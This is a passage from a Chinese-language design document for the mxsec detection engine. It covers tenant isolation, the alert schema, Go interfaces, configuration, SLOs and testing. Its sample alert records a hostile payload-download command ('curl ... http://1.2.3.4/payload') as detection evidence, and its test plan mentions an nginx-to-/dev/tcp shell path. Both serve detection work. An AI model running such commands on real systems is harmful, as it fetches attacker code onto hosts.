| 引擎层 | `TenantCtx` per-tenant 持有 RuleSet / WhitelistSet / Throttler / Models / Config |
| 状态层 | Redis key 强制带 `{tenant_id}` 段（L2 全部 key 已遵守） |

### 8.2 TenantCtx 装载

```go
// internal/server/engine/tenant/registry.go
type TenantCtx struct {
    TenantID    string
    DefaultMode string                          // observe / protect
    Rules       *rule.Registry
    Whitelist   *rule.Whitelist
    Throttle    *rule.HitThrottler
    SeqDetector *sequence.Detector
    Models      map[string]*ml.ONNXModel        // model_id → active
    Config      *Config                          // ml_enabled / llm_enabled / 阈值
    LLMClient   llmproxy.Client                  // 可空
    LastReload  time.Time
}

type Registry struct {
    mu       sync.RWMutex
    tenants  map[string]*TenantCtx
    db       *gorm.DB                             // read-only DSN
    rdb      *redis.Client
    pubKey   ed25519.PublicKey
    logger   *zap.Logger
}

func (r *Registry) Get(tenantID string) (*TenantCtx, error) {
    if tenantID == "" { return nil, errMissingTenant }
    r.mu.RLock()
    if tc, ok := r.tenants[tenantID]; ok {
        r.mu.RUnlock(); return tc, nil
    }
    r.mu.RUnlock()
    return r.lazyLoad(tenantID)
}

func (r *Registry) Reload(tenantID string) error { /* gRPC ControlService.PushRule 触发 */ }
```

### 8.3 跨租户穿越防护

- `Pipeline.Process(ctx, msg)` 首句 `if msg.TenantID == "" { return errMissingTenant }`
- 单元测试：构造 tenant A 上报事件 + tenant B 的规则集 → 期望 0 命中
- lint 规则：禁止 `Registry.tenants` map 通过 `range` 全量遍历产 alert
- Storyline 聚合 key 必含 tenant_id，跨主机关联也严格限定在同 tenant

详细多租户矩阵见 [`multi-tenant.md`](multi-tenant.md)。

### 8.4 租户级开关矩阵

| 开关 | 实现 |
|------|------|
| `tenant.ml_enabled=false` | Pipeline 跳过 L3 ML，仍跑 L1/L2/L4/L5 |
| `tenant.llm_enabled=false` | Storyline summary 走 fallback；Engine 不调 LLMProxy |
| `tenant.default_mode=observe` | Response Layer 全部规则按 observe 处理（除非规则级 protect override） |
| `tenant.quota_events_per_day` | 超出软限不阻塞，写 `mxsec_engine_quota_exceeded_total{tenant}` 通知运营 |

---

## 9. 告警 schema（与 mode 字段强约束）

### 9.1 Alert 完整字段

```json
{
  "alert_id": "alrt-2026060600001",
  "tenant_id": "t-bank-a",
  "host_id": "h-12345",
  "hostname": "prod-app-01",
  "agent_id": "a-abcdef",

  "rule_id": "SIGMA-CURL-EXEC",
  "rule_uid": "sigma-suspicious-curl-download",
  "rule_source": "sigma",
  "rule_version": "1.0.1",
  "engine_layer": "rule",
  "severity": "high",
  "category": "command_and_control",
  "att_ck": {
    "tactics": ["TA0011"],
    "techniques": ["T1105"]
  },
  "d3fend": ["D3-NTA"],

  "mode": "observe",
  "detected_at": "2026-06-06T10:23:45.123Z",
  "first_seen": "2026-06-06T10:23:40.001Z",
  "last_seen": "2026-06-06T10:23:45.123Z",
  "hit_count": 1,

  "evidence": {
    "raw_event_id": "evt-uuid",
    "process": {
      "pid": 1234, "ppid": 1, "exe": "/usr/bin/curl",
      "cmdline": "curl -o /tmp/x http://1.2.3.4/payload",
      "user": "www-data", "uid": 33,
      "parent": {"exe": "/usr/sbin/nginx", "cmdline": "nginx: worker"},
      "ancestor_chain": "systemd→nginx→curl"
    },
    "network": {"daddr": "1.2.3.4", "dport": 80, "proto": "tcp"},
    "fields": {"failed_count": "0"}
  },

  "storyline_id": "story-2026060600007",
  "score": 0.86,
  "ml_score": 0.71,
  "ioc_hit": true,
  "ioc_source": "abuse.ch/URLhaus",

  "would_action": {
    "type": "ip_block",
    "target": "1.2.3.4",
    "duration_sec": 3600,
    "reason": "下载未知 payload + IOC 命中",
    "agent_id": "a-abcdef"
  },
  "action": null,
  "action_result": null,

  "llm_summary": null,
  "feedback_hint": "如属业务跳板机，请加入 SIGMA-CURL-EXEC:tenant=t-bank-a:cmdline_glob=curl*business* 白名单"
}
```

### 9.2 mode 决策优先级

```
rule.mode_override > host.label_mode > tenant.default_mode > global.default(observe)
```

```go
// internal/server/engine/mode/resolver.go
func (r *Resolver) Resolve(tenantID, hostID, ruleID string) string {
    if m, ok := r.ruleOverride(ruleID); ok { return m }
    if m, ok := r.hostLabelOverride(tenantID, hostID); ok { return m }
    if m, ok := r.tenantDefault(tenantID); ok { return m }
    return r.globalDefault                            // 默认 observe
}
```

### 9.3 observe vs protect 字段差异

| 字段 | observe | protect |
|------|---------|---------|
| `mode` | `"observe"` | `"protect"` |
| `would_action` | 必填，描述"如果切防护会做什么" | `null` |
| `action` | `null` | 必填，包含 `executed_at` 等 |
| `action_result` | `null` | 包含 `status: success/pending_ack/ac_unreachable` |

### 9.4 Response Dispatcher

```go
func (d *Dispatcher) Dispatch(ctx context.Context, alert *Alert) error {
    if alert.Mode != "protect" {
        d.metrics.WouldAction.WithLabelValues(alert.TenantID, alert.WouldAction.Type).Inc()
        return nil
    }
    cmd := buildAgentCommand(alert.WouldAction)
    cmd.AgentID    = alert.AgentID
    cmd.Idempotency = alert.AlertID
    if _, err := d.ac.Dispatch(ctx, cmd); err != nil {
        alert.ActionResult = &ActionResult{Status: "ac_unreachable", Err: err.Error()}
        d.metrics.ActionFailed.WithLabelValues(alert.TenantID, cmd.Type).Inc()
        return nil  // 仍要发 alert，不阻塞
    }
    alert.Action       = cmd
    alert.ActionResult = &ActionResult{Status: "pending_ack", DispatchedAt: time.Now()}
    d.metrics.ActionExecuted.WithLabelValues(alert.TenantID, cmd.Type, "ok").Inc()
    return nil
}
```

> Agent 执行 ACK 通过 `mxsec.agent.command-ack` Topic 回流，Consumer 写回 alert 表更新 `action_result`，Engine 不持有 ACK 状态。

### 9.5 Storyline / Feedback schema

参考 [`engine-design.md`](engine-design.md) §4.2 / §4.3。Storyline 增量消息每 5 s flush 一次；Feedback 由 UI 写入，Engine 自消费用于调节权重。

---

## 10. LLMProxy 可选集成

### 10.1 触发场景

| 场景 | 何时调 | Fallback |
|------|--------|---------|
| Storyline 总结 | story 关闭前 / `stage_count ≥ 3` | 拼接 stage list 标题 |
| 告警语义解释 | 严重度 `critical` 且 `tenant.llm_enabled` | 用规则 description |
| 相似告警去重 | `mxsec_engine_alerts_emitted_total` per host 突增时 | 按 (rule_id, host) 静默 |
| 规则起草草案（人工触发） | 用户在 UI 点"AI 帮我写规则" | 由 Manager 直调 LLMProxy，不经 Engine |

### 10.2 调用规约

```go
// internal/server/engine/llm/client.go
type Client interface {
    Summarize(ctx context.Context, tenantID, prompt string) (string, error)
    Embed(ctx context.Context, tenantID, text string) ([]float32, error)
    DedupHint(ctx context.Context, tenantID string, embs [][]float32) ([]int, error)
}

type clientImpl struct {
    grpc      llmproxypb.LLMProxyServiceClient
    timeoutMs int
    breaker   *breaker.Breaker   // sony/gobreaker
    metrics   *prometheus.CounterVec
}

func (c *clientImpl) Summarize(ctx context.Context, tenantID, prompt string) (string, error) {
    ctx, cancel := context.WithTimeout(ctx, time.Duration(c.timeoutMs)*time.Millisecond)
    defer cancel()
    out, err := c.breaker.Execute(func() (any, error) {
        return c.grpc.Complete(ctx, &llmproxypb.CompleteRequest{
            TenantId: tenantID,
            Purpose:  "engine.storyline.summary",
            Prompt:   prompt,
            MaxTokens: 240,
        })
    })
    if err != nil {
        c.metrics.WithLabelValues(tenantID, "storyline_summary", "error").Inc()
        return "", err
    }
    c.metrics.WithLabelValues(tenantID, "storyline_summary", "ok").Inc()
    return out.(*llmproxypb.CompleteResponse).Text, nil
}
```

### 10.3 配额与熔断

LLMProxy 自身按 `tenant.quota_llm_usd` 控月度成本；Engine 端用 gobreaker 短路保护：连续 5 次失败 → 熔断 30s → 半开探测。熔断期间 storyline summary 走 fallback。

完整 LLM 厂商策略见 [`llmproxy-design.md`](llmproxy-design.md)。

---

## 11. 与 ml-models.md / falco-sigma-integration.md 的对接

### 11.1 与 [`ml-models.md`](ml-models.md)

- 模型清单（IForest / LightGBM / MiniLM / EDR Action Emb 等 10 个）在 ml-models.md 定义；
- Engine 仅做"推理"，**不训练**。训练 Job 在 Manager 端调 ClickHouse 历史样本 + ONNX 导出，gRPC 推送到 Engine；
- 模型版本生命周期：`pending → canary → stable → archived`，Engine 仅加载 `canary + stable`；
- 默认开关：IForest 默认开，LightGBM 默认开，MiniLM Embedding 仅 `llm_enabled || dedup_enabled` 时开（节省内存）。

### 11.2 与 [`falco-sigma-integration.md`](falco-sigma-integration.md)

- 三套上游规则（Falco / Sigma / Tetragon）由 RuleSync 子模块编译期转 CEL；
- Engine 内部**只认 CEL + mxsec Ed25519 重签**；运行时校验 `signature`，篡改即拒绝加载；
- 灰度通道 `staging / canary / stable` 由 RuleSync 控制，Engine 加载时按 `(rule_uid, channel)` 过滤；
- ATT&CK 战术 / D3FEND 标签的规整 / 覆盖度报表都在 RuleSync 完成，Engine 只消费已规整字段。

---

## 12. 性能优化策略

### 12.1 规则预编译 LRU cache

- CEL Program 缓存（§2.3），命中率 > 99%
- 缓存大小默认 4096（按 `rule_count × tenant_count` 估算）
- 命中率指标：`mxsec_engine_rule_cache_hit_ratio{tenant}`

### 12.2 并行 errgroup

- L1 候选规则 ≥ 20 启 4 worker
- L3 ML 推理用专属 worker pool，避免与 L1 争 CPU
- 全局 GOMAXPROCS = 物理核数；ORT IntraOp=1

### 12.3 倒排索引

- `event.type → []*compiledRule` map 把候选规则数从 1500 降到 30~80
- `data_type → []*compiledRule` 二级索引，跳过完全不匹配的 DataType

### 12.4 背压控制

| 信号 | 阈值 | 动作 |
|------|------|------|
| Kafka Consumer Lag > 60s | 副本积压 | Engine 自动调低 batch size 50% + 触发告警 |
| 单副本 CPU > 85% | 5 分钟持续 | 主动 Pause L3 ML（降级为仅 L1+L2），上报 `mxsec_engine_degraded_total` |
| 单副本 RSS > 4 GiB | 任意时刻 | 触发 Storyline 缓存 LRU 收缩；超 5 GiB 主动 OOM 自杀（让 K8s 拉起） |
| Redis RTT P99 > 100ms | 1 分钟 | L2 Sequence 暂停 Markov（保留滑窗 + 暴破，因为它们对 Redis 抖动更鲁棒） |
| LLMProxy 5 次连失败 | 短路 30s | Storyline summary 走 fallback |

### 12.5 Kafka Consumer Lag SLO

| 档位 | Lag P99 阈值 | 处理 |
|------|--------------|------|
| Green | ≤ 30 s | 正常 |
| Yellow | 30–120 s | Prometheus 告警 + HPA 触发扩副本 |
| Red | > 120 s | PagerDuty + 临时关闭 L3 ML / Storyline LLM 总结 |

```promql
max by (topic, consumergroup) (
  kafka_consumergroup_lag{consumergroup="mxsec-engine"}
)
```

### 12.6 GC / 内存

- 使用 `sync.Pool` 复用 CEL activation map 与 ONNX tensor
- 长尾 Storyline 30 min idle 强制关闭，避免内存膨胀
- ProcessTree 节点退出 2h 后强制清理

---

## 13. Go 接口骨架

### 13.1 顶层契约

```go
// internal/server/engine/engine.go
package engine

type EngineProvider interface {
    Start(ctx context.Context) error
    Stop(ctx context.Context) error
    ReloadTenant(tenantID string) error
    Health() Health
}

type Pipeline interface {
    // Process 处理单条 Kafka 消息，返回告警列表（可能为空）
    Process(ctx context.Context, msg *kafka.MQMessage) ([]*Alert, error)
}
```

### 13.2 5 大层 Provider

```go
// L1 规则层
type RuleEngine interface {
    Evaluate(ctx context.Context, tc *tenant.TenantCtx, ev *Event) []RuleHit
    Reload(tenantID string) error
    Throttled(tenantID, ruleID, hostID string) bool
    Whitelisted(tenantID string, ev *Event) bool
    Stats() RuleStats
}

// L2 序列层
type SequenceDetector interface {
    Update(ctx context.Context, tc *tenant.TenantCtx, ev *Event) []SeqHit
    Reset(tenantID, hostID string) error
}

// L3 ML 推理层
type MLInferencer interface {
    Infer(ctx context.Context, tc *tenant.TenantCtx, modelID string, feats []float32) (*Prediction, error)
    Activate(tenantID, modelID, version string) error
    Health() map[string]string
}

// L4 Storyline 图层
type StorylineBuilder interface {
    Ingest(ctx context.Context, tc *tenant.TenantCtx, alert *Alert) (storylineID string, err error)
    Flush(ctx context.Context) error
    Close(ctx context.Context, storylineID string) error
}

// L5 K8s Audit 检测层
type KubeDetector interface {
    DetectAudit(ctx context.Context, tc *tenant.TenantCtx, evt *AuditEvent) []*Alert
    Reload(tenantID string) error
}

// 响应层
type ResponseDispatcher interface {
    Dispatch(ctx context.Context, alert *Alert) error
}

// LLM 客户端（可选）
type LLMClient interface {
    Summarize(ctx context.Context, tenantID, prompt string) (string, error)
    Embed(ctx context.Context, tenantID, text string) ([]float32, error)
    DedupHint(ctx context.Context, tenantID string, embs [][]float32) ([]int, error)
}
```

### 13.3 Pipeline 实现骨架

```go
// internal/server/engine/pipeline/pipeline.go
type pipelineImpl struct {
    reg        *tenant.Registry
    rule       RuleEngine
    seq        SequenceDetector
    ml         MLInferencer
    story      StorylineBuilder
    k8s        KubeDetector
    dispatch   ResponseDispatcher
    modeResolv *mode.Resolver
    enricher   *proctree.Enricher
    producer   kafka.AsyncProducer
    metrics    *Metrics
    logger     *zap.Logger
}

func (p *pipelineImpl) Process(ctx context.Context, msg *kafka.MQMessage) ([]*Alert, error) {
    if msg.TenantID == "" {
        p.metrics.TenantMissing.Inc()
        return nil, errMissingTenant
    }
    tc, err := p.reg.Get(msg.TenantID)
    if err != nil { return nil, err }

    ev := decodeEvent(msg)
    p.enricher.Enrich(tc.TenantID, ev)              // proctree.*

    // L5 K8s 专用分流
    if ev.Type == "k8s_audit" {
        alerts := p.k8s.DetectAudit(ctx, tc, ev.Audit)
        return p.finalize(ctx, tc, alerts)
    }

    if p.rule.Whitelisted(tc.TenantID, ev) {
        p.metrics.Whitelisted.Inc()
        return nil, nil
    }

    var alerts []*Alert

    // L1
    for _, hit := range p.rule.Evaluate(ctx, tc, ev) {
        if !p.rule.Throttled(tc.TenantID, hit.RuleID, ev.HostID) {
            alerts = append(alerts, buildAlert(tc, ev, hit, "rule"))
        }
    }
    // L2
    for _, hit := range p.seq.Update(ctx, tc, ev) {
        alerts = append(alerts, buildAlert(tc, ev, hit.ToRuleHit(), "sequence"))
    }
    // L3 ML（按 event.type 路由模型）
    if tc.Config.MLEnabled {
        if pred, err := p.runML(ctx, tc, ev); err == nil && pred != nil && pred.Anomalous {
            alerts = append(alerts, buildMLAlert(tc, ev, pred))
        }
    }

    return p.finalize(ctx, tc, alerts)
}

func (p *pipelineImpl) finalize(ctx context.Context, tc *tenant.TenantCtx, alerts []*Alert) ([]*Alert, error) {
    out := make([]*Alert, 0, len(alerts))
    for _, a := range alerts {
        a.Mode = p.modeResolv.Resolve(tc.TenantID, a.HostID, a.RuleID)
        // L4 Storyline 聚合
        if sid, err := p.story.Ingest(ctx, tc, a); err == nil { a.StorylineID = sid }
        // Response
        _ = p.dispatch.Dispatch(ctx, a)
        // 产 Kafka
        _ = p.producer.SendAlert(ctx, a)
        out = append(out, a)
    }
    return out, nil
}
```

---

## 14. 配置 YAML 示例

```yaml
# /etc/mxsec/engine.yaml
service:
  name: mxsec-engine
  http_addr: ":8083"             # 仅 /metrics + /healthz
  grpc_addr: ":9083"             # 控制面：Manager 调用
  log_level: info
  log_format: json
  goroutine_dump_on_signal: SIGUSR1

mode:
  global_default: observe        # 严禁默认 protect

kafka:
  brokers: ["kafka-0:9092","kafka-1:9092","kafka-2:9092"]
  consumer_group: mxsec-engine
  session_timeout_sec: 30
  heartbeat_interval_sec: 3
  max_poll_interval_sec: 300
  fetch_min_bytes: 1024
  fetch_max_wait_ms: 200
  topics:
    - mxsec.agent.ebpf
    - mxsec.agent.events
    - mxsec.agent.baseline
    - mxsec.agent.scanner
    - mxsec.agent.asset
    - mxsec.agent.heartbeat
    - mxsec.agent.remediation
    - mxsec.vuln.advisory
  producer:
    acks: all
    compression: snappy
    max_message_bytes: 4194304
    flush_frequency_ms: 200
    flush_max_messages: 256

mysql_readonly:
  dsn: "mxsec_ro:***@tcp(mysql:3306)/mxsec?parseTime=true"
  max_open: 8

redis:
  addrs: ["redis-sentinel:26379"]
  master: mxsec
  password_env: REDIS_PASSWORD
  pool_size: 64
  read_timeout_ms: 300
  write_timeout_ms: 300

rule:
  reload_interval_sec: 30
  cel_program_cache_size: 4096
  parallel_threshold: 20
  parallel_workers: 4
  whitelist_enabled: true
  throttle:
    burst_threshold: 100
    refill_window_sec: 60
    silence_sec: 600
    lru_capacity: 10000
  signature:
    public_key_path: /etc/mxsec/certs/rule_pub.ed25519
    reject_unsigned: true

sequence:
  enable_markov: true
  markov_threshold: 1.0e-5
  enable_ngram: true
  ngram_size: 3
  ngram_jaccard_threshold: 0.7
  port_scan:
    window_sec: 60
    unique_ports_threshold: 30
  bruteforce:
    window_sec: 60
    failed_threshold: 5
    auto_block_ttl_sec: 3600
  heartbeat:
    missing_count: 3
    interval_sec: 30

ml:
  enabled: true
  runtime: onnx
  models_dir: "/var/lib/mxsec/engine/models"
  inference_timeout_ms: 50
  batch_size: 16
  batch_max_wait_ms: 5
  fallback_on_runtime_error: true
  canary:
    enabled: true
    candidate_traffic_pct: 5

storyline:
  flush_interval_sec: 5
  story_idle_close_sec: 1800
  enable_lateral_movement: true
  max_active_per_tenant: 5000
  llm_summary:
    enabled: false
    max_chars: 240

k8s:
  enabled: true
  rules_dir: /etc/mxsec/engine/k8s-rules
  admission_dryrun_observe: true
  exclude:
    namespaces: ["kube-system","kube-public","kube-node-lease"]
    user_prefixes: ["system:node:","system:kube-controller-manager","system:kube-scheduler","system:apiserver","system:serviceaccount:kube-system:"]
    user_agent_prefixes: ["kubelet/","kube-apiserver/","kube-controller-manager/","kube-scheduler/"]

llmproxy:
  enabled: false                  # 全局默认关闭，租户独立打开
  endpoint: "llmproxy:9091"
  tls_cert: /etc/mxsec/certs/engine.crt
  tls_key:  /etc/mxsec/certs/engine.key
  internal_token_env: MXSEC_LLM_INTERNAL_TOKEN
  timeout_ms: 8000
  breaker:
    fail_threshold: 5
    open_dur_sec: 30

agentcenter:
  endpoints: ["ac-0:9080","ac-1:9080"]
  tls_cert: /etc/mxsec/certs/engine.crt
  tls_key:  /etc/mxsec/certs/engine.key
  internal_token_env: MXSEC_AC_INTERNAL_TOKEN
  dispatch_timeout_ms: 5000
  retry: 3

backpressure:
  consumer_lag_yellow_sec: 30
  consumer_lag_red_sec: 120
  cpu_throttle_pct: 85
  rss_soft_limit_mb: 4096
  rss_hard_limit_mb: 5120

metrics:
  path: /metrics
  port: 8083

tenant_isolation:
  refuse_missing_tenant_id: true
  default_tenant_id_fallback: ""    # 严格模式：留空
```

---

## 15. 性能 SLO

### 15.1 端到端

| 指标 | 目标 | 测量点 |
|------|------|--------|
| **端到端告警延迟 P95（Agent 上报 → `mxsec.engine.alert` 写出）** | **≤ 5 s** | Kafka header `received_at` ↔ alert `detected_at` 差 |
| 端到端告警延迟 P99 | ≤ 10 s | 同上 |
| 单副本吞吐 | ≥ 10k msg/s | 内部 benchmark |

### 15.2 单层

| 层 | SLO | 备注 |
|----|-----|------|
| L1 单规则评估 P95 | ≤ 1.2 ms | cel-go + LRU cache |
| L1 全集评估 P95（1500 规则 / 租户） | ≤ 5 ms | event.type 索引 + 并行 |
| L2 Redis RTT P99 | ≤ 5 ms | redis-sentinel + pipeline |
| L3 ML 推理 P95 | ≤ 50 ms | ONNX Runtime CPU + batch 16 |
| L4 Storyline flush 周期 | 5 s | 增量 produce |
| L5 K8s 检测 P95 | ≤ 2 ms | 全局排除前置 |

### 15.3 质量

| 指标 | 目标 | 周期 |
|------|------|------|
| 误报率（observe 模式磨合后） | ≤ 2% | 月度 UI feedback |
| 告警准确率 | ≥ 85% | 月度 UI feedback |
| 数据回放历史攻击命中率 | ≥ 85% | 季度 |

### 15.4 资源

| 指标 | 目标 | 备注 |
|------|------|------|
| 内存稳态 | < 4 GiB / 副本（50 租户 + 200 模型） | RSS |
| CPU 稳态 | < 6 核 | host cgroup |
| Kafka Consumer Lag P99 | ≤ 30 s | 与 architecture.md 对齐 |

### 15.5 Prometheus 指标清单

```
# 消息流
mxsec_engine_messages_consumed_total{topic, tenant}
mxsec_engine_messages_decoded_failed_total{topic}
mxsec_engine_tenant_missing_total

# 管线延迟
mxsec_engine_pipeline_latency_seconds_bucket{stage}            # decode/enrich/whitelist/rule/seq/ml/story/k8s/dispatch
mxsec_engine_end_to_end_latency_seconds_bucket{tenant}

# L1
mxsec_engine_rule_eval_seconds_bucket{rule_id}
mxsec_engine_rule_hits_total{rule_id, tenant, mode}
mxsec_engine_rule_cache_hit_ratio{tenant}
mxsec_engine_rule_throttled_total{rule_id, tenant}

# L2
mxsec_engine_seq_hits_total{type, tenant}
mxsec_engine_seq_redis_unavailable_total

# L3
mxsec_engine_ml_inference_seconds_bucket{model_id, tenant}
mxsec_engine_ml_score_histogram{model_id, tenant}
mxsec_engine_ml_fallback_total{model_id, tenant}
mxsec_engine_model_active{tenant, model_id, version}

# L4
mxsec_engine_storyline_active{tenant}
mxsec_engine_storyline_flush_seconds_bucket
mxsec_engine_storyline_stage_count_histogram{tenant}

# L5
mxsec_engine_k8s_audit_alerts_total{rule_id, tenant, mode}

# 响应
mxsec_engine_alerts_emitted_total{tenant, mode, severity, source}
mxsec_engine_actions_executed_total{tenant, action_type, status}    # protect
mxsec_engine_actions_would_total{tenant, action_type}               # observe

# 反馈与磨合
mxsec_engine_feedback_consumed_total{tenant, label}
mxsec_engine_precision{tenant, rule_id}
mxsec_engine_recall{tenant, rule_id}
mxsec_engine_fp_rate{tenant, rule_id}

# 资源
mxsec_engine_tenant_count
mxsec_engine_rule_count{tenant}
mxsec_engine_kafka_lag{topic, partition}
mxsec_engine_degraded_total{reason}
mxsec_engine_quota_exceeded_total{tenant}

# LLM
mxsec_engine_llm_calls_total{tenant, purpose, status}
mxsec_engine_llm_breaker_state{purpose}                              # 0=closed/1=open/2=half-open
```

---

## 16. 反馈闭环与磨合（与 operating-modes.md 对齐）

| 输入 | 处理 | 输出 |
|------|------|------|
| UI 标记 `false_positive` | 该 rule × tenant 计数 +1；连续 10 条同源 → 自动生成"白名单建议草案" | Manager UI 提示运营审批 |
| UI 标记 `true_positive` | 规则进入 `protect_candidate` 池；30 天内持续 `fp_rate ≤ 2%` 触发"可建议切 protect" UI Banner | UI Banner |
| UI 标记 `uncertain` | 入 `mxsec.engine.feedback.review.dlq` | 人工复核 |
| 自动磨合指标 | `mxsec_engine_precision / recall / fp_rate` 持续上报 | Prometheus + Grafana |
| 离线训练 | Manager 训练 Job 拉 `mxsec.engine.feedback` + ClickHouse 历史样本 → 输出 ONNX + transition matrix | gRPC `ActivateModel` 灰度推 5/25/100% |

满足 90 天 + `precision ≥ 0.95` + `fp_rate ≤ 0.02` 的规则，UI 提示"可建议切 protect"，符合 [`operating-modes.md`](operating-modes.md) §3 的 G2/G3 门槛。

---

## 17. 容错与降级矩阵

| 故障 | 表现 | Engine 行为 |
|------|------|------------|
| Kafka 不可用 | Consumer claim 失败 | 副本反复退避重连；Producer 异常时 Alert 落本地 jsonl `/var/lib/mxsec/engine/alert-fallback/`，恢复后 replayer 回填 |
| Redis 不可用 | L2 失败 | Markov/n-gram 降级，保留滑窗 + 暴破（rdb pipeline，rdb 抖动鲁棒），`mxsec_engine_seq_redis_unavailable_total` +1 |
| AC 不可用（protect） | Dispatch 超时 | 重试 3 次，仍失败 → alert 照发，`action_result.status = ac_unreachable` |
| LLMProxy 不可用 | Storyline summary 缺失 | 走 fallback stage list，不阻塞 |
| ONNX 加载失败 | 推理 panic | Go IForest fallback；模型表 `active=false` 上报 |
| Manager 不可用 | 规则推送阻塞 | 沿用内存中规则；30s 后主动尝试重连；不影响检测 |
| 单条毒丸消息 | panic | recover → 写 `mxsec.agent.{topic}.dlq` + 计数器 |
| 租户缺失 | `errMissingTenant` | 进 DLQ + `mxsec_engine_tenant_missing_total` +1 |
| 规则签名校验失败 | `VerifyRule` 失败 | 拒绝加载该规则；UI 红色标记 + 通知 mxsec 维护方 |

---

## 18. 安全约束

- Engine 进程**无 MySQL 写 DSN**：部署期强约束 GORM `mysql_readonly` DSN；
- Engine 进程**不持有客户 LLM API Key**：所有 LLM 调用走 LLMProxy；
- 配置文件中 Redis / MySQL 密码必须 `*_env` 注入，禁止明文落 yaml；
- 容器以 `nonroot` 用户运行（uid=10001）；
- 启动期校验 `tenant_isolation.refuse_missing_tenant_id=true`；
- Audit：每次 `protect` 模式 Dispatch 写 `mxsec.audit` Topic（含 `operator=engine, rule_id, action, target`）；
- 规则签名公钥固化在镜像，私钥由 mxsec 平台 HSM/Vault 管理；KA 客户私钥独立。

---

## 19. 测试矩阵

| 类型 | 范围 | 通过标准 |
|------|------|---------|
| Pipeline 单元测试 | L1/L2/L3/L4/L5 各 ≥ 30 case | 100% 覆盖核心分支 |
| CEL 求值压力 | 1500 规则 × 100k EPS | P95 ≤ 5 ms / event |
| 多租户隔离 | 租户 A 事件 + 租户 B 规则集 | 0 命中 |
| Throttle 行为 | 单 host 单 rule 注入 200 命中/分钟 | 100 命中后进入 silence，10min 内再无 produce |
| Markov 异常 | 注入 nginx → /dev/tcp 罕见路径 | 必命中 |
| ML fallback | 删除 ONNX 文件 / 注入 panic | 自动切 Go IForest，`fallback_total` +1 |
| Storyline 横移 | 同 src_ip 在 host A/B 各 1 alert，10min 内 | 合并到同一 storyline |
| K8s privileged Pod | Audit 注入 `securityContext.privileged=true` | 必产 alert + att_ck T1611 |
| mode 切换 | 同规则租户级 observe / 主机级 protect | host 级生效，alert mode=protect |
| 热重载丢事件 | upsert/delete 并发 1000 次 | 0 丢事件 |
| 端到端 SLO | 100 host × 1k EPS 模拟 60 min | 延迟 P95 ≤ 5 s，CPU < 6 核 |

---

## 20. 实施 Sprint 计划（与 engine-design.md §16 一致）

| Sprint | 内容 | 验收 |
|--------|------|------|
| **S0**（1 周） | proto 草案 + 配置 + 目录骨架；空 Engine 进程 `/healthz` 200 | `make build-engine` |
| **S1**（2 周） | L1 规则层从 Consumer 搬入，跑通 CEL + throttle + whitelist | 老规则集 ≥ 200 条全部通过单测 |
| **S2**（2 周） | L2 序列 + L3 ML 整合，IForest fallback + ONNX runtime 接通 | benchmark 8k EPS / 副本 |
| **S3**（2 周） | L4 Storyline + L5 K8s 从 Manager 搬入 | 攻击链多阶段 e2e 测试 |
| **S4**（1 周） | 多租户 tenantBucket + gRPC ControlService | 100 租户压测 |
| **S5**（1 周） | mode 决策 + Response Dispatcher + AC gRPC 集成 | observe/protect 切换 e2e |
| **S6**（1 周） | LLMProxy 集成（可选）+ 反馈消费 + Prometheus 指标全 | SLO 全部达标 |
| **S7**（1 周） | Falco / Sigma / Tetragon 转换器接入 | 50 条社区规则导入跑通 |

---

## 21. 与对标产品差异

| 维度 | mxsec Engine | 青藤万象 / 蜂巢 |
|------|--------------|----------------|
| 部署形态 | 独立微服务，K8s HPA 水平扩展 | Server 集群内嵌检测，多模块单体 |
| 检测层级 | 规则 + 序列 + ML + Storyline + K8s 五层显式 | 入侵检测 6 模块 + 容器行为模型（隐式） |
| 规则中台 | CEL + Sigma + Falco + Tetragon 四源统一转 CEL | 自研规则 DSL + 行为模型，不开放 Sigma/Falco |
| ML 推理 | 本地 ONNX CPU 主导 + LLM 可选 | 行为基线学习（云端聚合 + 本地异常） |
| 多租户 | from-day-1 全管线分桶 | 单部署单租户为主，KA 多套部署 |
| 运行模式 | 默认 observe，6 门槛 + 4 级灰度切 protect | 检测+部分自动响应出厂，模块开关 |
| 反馈闭环 | UI feedback → Kafka → 离线训练 → 灰度模型 | UI 标注 → 模型重训（云端） |
| 开源 / 可定制 | Apache-2.0，规则 / 模型客户可改 | 闭源商业 |

---

## 22. 参考文档

| 主题 | 文档 |
|------|------|
| 平台架构总图 | [`architecture.md`](architecture.md) |
| 运行模式（监听 / 防护） | [`operating-modes.md`](operating-modes.md) |
| 多租户设计 | [`multi-tenant.md`](multi-tenant.md) |
| Engine 服务设计（边界 / 接口 / 部署） | [`engine-design.md`](engine-design.md) |
| EDR Agent 采集 | [`edr-agent-design.md`](edr-agent-design.md) |
| 本地 ML 模型清单 | [`ml-models.md`](ml-models.md) |
| LLMProxy 设计 | [`llmproxy-design.md`](llmproxy-design.md) |
| Falco / Sigma / Tetragon 集成 | [`falco-sigma-integration.md`](falco-sigma-integration.md) |
| VulnSync 服务设计 | [`vulnsync-design.md`](vulnsync-design.md) |
| 漏洞模块设计 | [`vuln-module-design.md`](vuln-module-design.md) |
| 资产统一模型 | [`asset-model.md`](asset-model.md) |
| DataType 分配 | [`datatype-allocation.md`](datatype-allocation.md) |
| API 参考 | [`api-reference.md`](api-reference.md) |
| 部署指南 | [`deployment.md`](deployment.md) |
| 配置参考 | [`configuration.md`](configuration.md) |
| 原始评估（内部） | `ref/01-服务端架构.md` §3 / `ref/04-运行时.md` §5 |
| 商业化路线（内部） | `ref/00-总体评估与商业化路线.md` |
